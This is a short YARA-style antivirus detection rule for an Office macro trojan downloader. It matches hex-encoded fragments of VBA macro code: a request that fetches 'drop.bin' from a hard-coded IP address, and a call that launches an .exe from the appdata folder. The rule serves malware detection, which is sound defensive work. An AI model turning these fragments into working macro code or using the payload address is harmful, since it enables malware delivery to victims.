
rule TrojanDownloader_O97M_EncDoc_F_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.F!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_03_0 = {53 68 65 6c 6c 41 70 70 2e 4f 70 65 6e 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 2b 20 22 5c [0-12] 2e 65 78 65 22 } //1
		$a_01_1 = {57 69 6e 48 74 74 70 52 65 71 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 31 39 39 2e 31 39 2e 32 32 36 2e 33 33 2f 64 72 6f 70 2e 62 69 6e 22 2c 20 46 61 6c 73 65 } //1 WinHttpReq.Open "GET", "http://199.19.226.33/drop.bin", False
		$a_01_2 = {4d 61 67 69 63 20 77 6f 72 64 20 6e 6f 74 20 66 6f 75 6e 64 3f 21 20 69 73 20 68 65 20 61 6c 72 65 61 64 79 20 64 65 61 64 3f } //1 Magic word not found?! is he already dead?
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}